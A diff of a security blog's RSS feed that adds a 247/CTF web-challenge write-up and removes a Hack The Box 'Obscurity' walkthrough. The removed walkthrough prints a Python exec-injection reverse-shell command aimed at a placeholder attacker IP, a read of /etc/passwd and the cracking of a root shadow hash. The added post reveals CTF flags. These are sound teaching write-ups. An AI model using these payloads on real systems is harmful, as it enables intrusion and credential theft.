@@ -1,4 +1,42 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Dev & Security]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 3.18</generator><lastBuildDate>Fri, 26 Jun 2020 12:54:05 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[RingZer0 JavaScript Challenges Write-up | Part II]]></title><description><![CDATA[<p><em>Click <a href="https://inesmartins.github.io/ringzer0-js-ctf-write-up-client-side-validation-is-bad/">here</a> for Part I.</em></p><h2 id="5-valid-key-required">5 - <a href="https://ringzer0ctf.com/challenges/58">Valid Key Required</a></h2><p>On this level instead of user/password form we see an input field where we're supposed to enter a key:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/image-29.png" class="kg-image"></figure><p>The source code for this one is a little more complex. Let's start with the function that's triggered when the</p>]]></description><link>https://inesmartins.github.io//ringzer0-javascript-challenges-write-up-part-ii/</link><guid isPermaLink="false">5ef37f721e7da103a083e372</guid><category><![CDATA[ctf]]></category><category><![CDATA[javascript]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Wed, 24 Jun 2020 21:49:01 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/94077557_2585400745052781_1404098931607994368_o-1.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/94077557_2585400745052781_1404098931607994368_o-1.jpg" alt="RingZer0 JavaScript Challenges Write-up | Part II"><p><em>Click <a href="https://inesmartins.github.io/ringzer0-js-ctf-write-up-client-side-validation-is-bad/">here</a> for Part I.</em></p><h2 id="5-valid-key-required">5 - <a href="https://ringzer0ctf.com/challenges/58">Valid Key Required</a></h2><p>On this level instead of user/password form we see an input field where we're supposed to enter a key:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/image-29.png" class="kg-image" alt="RingZer0 JavaScript Challenges Write-up | Part II"></figure><p>The source code for this one is a little more complex. Let's start with the function that's triggered when the user clicks "Validate" - <code>validatekey</code>:</p><pre><code class="language-javascript">var ref = {T: "BG8", J: "jep", j: "M2L", K: "L23", H: "r1A"};
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Dev & Security]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 3.18</generator><lastBuildDate>Sun, 28 Jun 2020 15:39:44 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[247/CTF Write-up | Web Challenges]]></title><description><![CDATA[<p>This post will be updated as I solve more of the <a href="https://247ctf.com/dashboard">247/CTF platform</a>'s web challenges.</p><h2 id="1-trusted-client">1. Trusted Client</h2><blockquote>Developers don't always have time to setup a backend service when prototyping code<em>.</em> Storing credentials on the client side should be fine as long as it's obfuscated right?</blockquote><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://inesmartins.github.io//content/images/2020/06/jsfuck.png" class="kg-image"><figcaption>snapshot from</figcaption></figure>]]></description><link>https://inesmartins.github.io//247-ctf-web-write-up/</link><guid isPermaLink="false">5ef865c81e7da103a083e681</guid><category><![CDATA[jsfuck]]></category><category><![CDATA[web]]></category><category><![CDATA[247ctf]]></category><category><![CDATA[ctf]]></category><category><![CDATA[jwt]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 28 Jun 2020 10:47:34 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/ctf.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/ctf.png" alt="247/CTF Write-up | Web Challenges"><p>This post will be updated as I solve more of the <a href="https://247ctf.com/dashboard">247/CTF platform</a>'s web challenges.</p><h2 id="1-trusted-client">1. Trusted Client</h2><blockquote>Developers don't always have time to setup a backend service when prototyping code<em>.</em> Storing credentials on the client side should be fine as long as it's obfuscated right?</blockquote><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://inesmartins.github.io//content/images/2020/06/jsfuck.png" class="kg-image" alt="247/CTF Write-up | Web Challenges"><figcaption>snapshot from the source code</figcaption></figure><p>Yup, this is <a href="https://en.wikipedia.org/wiki/JSFuck">JSFuck</a>. I used an <a href="http://codertab.com/jsunfuck">online decoder</a> to get the original JS code:</p><pre><code class="language-javascript">function anonymous() {
+	if (this.username.value == 'the_flag_is' &amp;&amp; this.password.value == '247CTF{6c91b7f7f12c852f892293d16dba0148}') { 
+        alert('Valid username and password!');
+    } else { alert('Invalid username and password!'); }
+}</code></pre><p>Note that some of the online decoders out there are a little buggy, take a look at the console, it might help.</p><hr><h2 id="2-secured-session">2. Secured Session</h2><blockquote>If you can guess our random secret key, we will tell you the flag securely stored in your session.</blockquote><pre><code class="language-python">import os
+from flask import Flask, request, session
+from flag import flag
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.urandom(24)
+
+def secret_key_to_int(s):
+    try:
+        secret_key = int(s)
+    except ValueError:
+        secret_key = 0
+    return secret_key
+
+@app.route("/flag")
+def index():
+    secret_key = secret_key_to_int(request.args['secret_key']) if 'secret_key' in request.args else None
+    session['flag'] = flag
+    if secret_key == app.config['SECRET_KEY']:
+      return session['flag']
+    else:
+      return "Incorrect secret key!"
+
+@app.route('/')
+def source():
+    return "
+%s
+" % open(__file__).read()
+
+if __name__ == "__main__":
+    app.run()</code></pre><p>So, it seems that as long as we send a non-null <code>secret_key</code> parameter, the flag is written to the <code>flag</code> property of the <code>session</code> cookie. Let's confirm this:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/size.png" class="kg-image" alt="247/CTF Write-up | Web Challenges"></figure><p>As you can see, the <code>session</code> cookie is a <a href="https://en.wikipedia.org/wiki/JSON_Web_Token">JWT</a>, which we can <a href="https://jwt.io/">reverse</a>:</p><pre><code>{
+  "flag": {
+    " b": "MjQ3Q1RGe2RhODA3OTVmOGE1Y2FiMmUwMzdkNzM4NTgwN2I5YTkxfQ=="
+  }
+}</code></pre><p>Decoding the base64 string we get: <code>247CTF{da80795f8a5cab2e037d7385807b9a91}</code>.</p>]]></content:encoded></item><item><title><![CDATA[RingZer0 JavaScript Challenges Write-up | Part II]]></title><description><![CDATA[<p><em>Click <a href="https://inesmartins.github.io/ringzer0-js-ctf-write-up-client-side-validation-is-bad/">here</a> for Part I.</em></p><h2 id="5-valid-key-required">5 - <a href="https://ringzer0ctf.com/challenges/58">Valid Key Required</a></h2><p>On this level instead of user/password form we see an input field where we're supposed to enter a key:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/image-29.png" class="kg-image"></figure><p>The source code for this one is a little more complex. Let's start with the function that's triggered when the</p>]]></description><link>https://inesmartins.github.io//ringzer0-javascript-challenges-write-up-part-ii/</link><guid isPermaLink="false">5ef37f721e7da103a083e372</guid><category><![CDATA[ctf]]></category><category><![CDATA[javascript]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Wed, 24 Jun 2020 21:49:01 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/94077557_2585400745052781_1404098931607994368_o-1.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/94077557_2585400745052781_1404098931607994368_o-1.jpg" alt="RingZer0 JavaScript Challenges Write-up | Part II"><p><em>Click <a href="https://inesmartins.github.io/ringzer0-js-ctf-write-up-client-side-validation-is-bad/">here</a> for Part I.</em></p><h2 id="5-valid-key-required">5 - <a href="https://ringzer0ctf.com/challenges/58">Valid Key Required</a></h2><p>On this level instead of user/password form we see an input field where we're supposed to enter a key:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/image-29.png" class="kg-image" alt="RingZer0 JavaScript Challenges Write-up | Part II"></figure><p>The source code for this one is a little more complex. Let's start with the function that's triggered when the user clicks "Validate" - <code>validatekey</code>:</p><pre><code class="language-javascript">var ref = {T: "BG8", J: "jep", j: "M2L", K: "L23", H: "r1A"};
 
 function validatekey() {
     e = false;
@@ -12,7 +50,6 @@ function validatekey() {
         
         var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function));
         
-        // success case: o == ref
         if (!equal(o,ref))
             e = true;
     	} catch (e) {
@@ -1152,48 +1189,4 @@ Evil-WinRM shell v1.9
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Chase\Documents&gt;
 </code></pre>
-<!--kg-card-end: markdown--><p>12. The user's flag is on the Dektop!</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Obscurity]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219">here</a>.</em></p><p>1. After doing an initial scan with nmap, we find that this is a Linux (Ubuntu) machine with 2 exposed services: OpenSSH on port 22 and a custom web server on port 8080.</p><!--kg-card-begin: markdown--><pre><code>$ nmap -sC -sV -oA obscurity.htb
-
-22/tcp open ssh OpenSSH</code></pre>]]></description><link>https://inesmartins.github.io//htb-walkthrough-obscurity/</link><guid isPermaLink="false">5edd283564e6e34f1b3f7f1d</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 07 Jun 2020 17:54:05 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/1-1.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/1-1.png" alt="HTB Write-up | Obscurity"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219">here</a>.</em></p><p>1. After doing an initial scan with nmap, we find that this is a Linux (Ubuntu) machine with 2 exposed services: OpenSSH on port 22 and a custom web server on port 8080.</p><!--kg-card-begin: markdown--><pre><code>$ nmap -sC -sV -oA obscurity.htb
-
-22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-8080/tcp open http-proxy BadHTTPServer
-```</code></pre>
-<!--kg-card-end: markdown--><p>2. There is some content on the website which has some useful information:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2020/06/obscurity_img0_1.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2020/06/obscurity_img0_2.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2020/06/obscurity_img0_3.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><p>3. So, now we know there is a file called 'SuperSecureServer.py' which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> to find it but you could probably just get it logically:</p><!--kg-card-begin: markdown--><pre><code>$ wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
-</code></pre>
-<!--kg-card-end: markdown--><p>4. The mistery directory is <strong>develop</strong>, so know we have access to the server's source code, in the form of a Python script: <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py">http://obscurity.htb:8080/develop/SuperSecureServer.py</a>.<br>While analysing it, we find something interesting:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/obscurity_img1.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><p>5. Here's our foothold: we can exploit this <a href="https://www.w3schools.com/python/ref_func_exec.asp">exec</a> and get us a shell as wwwdata.</p><!--kg-card-begin: markdown--><pre><code>$ wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'
-</code></pre>
-<!--kg-card-end: markdown--><p>6. Our first goal is to become robert.</p><!--kg-card-begin: markdown--><pre><code>$ cat etc/passwd
-...
-robert:x:1000:1000:robert:/home/robert:/bin/bash
-</code></pre>
-<!--kg-card-end: markdown--><p>7. Listing the contents of robert's home directy, we get some interesting files:</p><!--kg-card-begin: markdown--><pre><code>$ ls /home/robert
-BetterSSH/BetterSSH.py
-check.txt
-out.txt
-passwordreminder.txt
-SuperSecureCrypt.py
-user.txt
-</code></pre>
-<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code>$ cat check.txt
-Encrypting this file with your key should result in out.txt, make sure your key is correct!
-</code></pre>
-<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code>$ cat out.txt
-¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v$$ cat passwordreminder.txt´ÑÈÌÉàÙÁÑé¯·¿
-</code></pre>
-<!--kg-card-end: markdown--><p>8. So, by encrypting check.txt with an unknown key we get out.txt.<br>Also, when use we this key to encrypt robert's password we get the content of passwordreminder.txt.</p><p>This is a classic <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a>.<br>Let's create a script to find the key!</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/script1.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><p>9. Now that we have the key ('alexandrovich'), let's use it to find robert's password!</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/script2.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><p>10. Now that we have robert's password we can SSH into the machine, get the user flag and move on to root. We start by doing some enumeration with <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>:</p><!--kg-card-begin: markdown--><pre><code>$ ./LinEnum.sh...
-User robert may run the following commands on obscure:
-(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
--e
-</code></pre>
-<!--kg-card-end: markdown--><p>11. Let's run BetterSSH as sudo to test this:</p><!--kg-card-begin: markdown--><pre><code>$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
-Enter username: robert
-Enter password: xxx
-Authed!
-</code></pre>
-<!--kg-card-end: markdown--><p>12. After looking at BetterSSH.py we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on /tmp/SSH/.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/script3.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><p>13. So we create a script to print them to a file we can read after the process is finished (/tmp/o.txt):</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/script4.png" class="kg-image" alt="HTB Write-up | Obscurity"></figure><p>14. Finally, we use <a href="https://www.openwall.com/john/">JohnTheRipper</a> to crack the hash:</p><!--kg-card-begin: markdown--><pre><code>$ echo &quot;root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7&quot; &gt; shadow
-$ echo &quot;root:x:0:0:root:/root:/bin/bash&quot; &gt; passwd
-$ unshadow passwd shadow &gt; crack.password.db
-$ john crack.password.db
-</code></pre>
-<!--kg-card-end: markdown--><p>15. That's it, hope you enjoyed it!</p>]]></content:encoded></item></channel></rss>
+<!--kg-card-end: markdown--><p>12. The user's flag is on the Dektop!</p>]]></content:encoded></item></channel></rss>
